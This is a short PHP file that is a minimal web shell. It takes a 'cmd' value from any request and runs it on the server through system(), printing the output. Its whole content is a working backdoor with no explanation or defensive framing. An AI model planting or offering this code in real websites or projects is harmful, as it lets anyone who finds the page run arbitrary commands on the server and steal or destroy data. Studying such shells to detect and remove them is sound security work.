<?php
$cmd = $_REQUEST['cmd'];
if (isset($cmd) && ($cmd!="")){
	echo "<pre><div align=\"left\">";
	system($cmd);
}
?>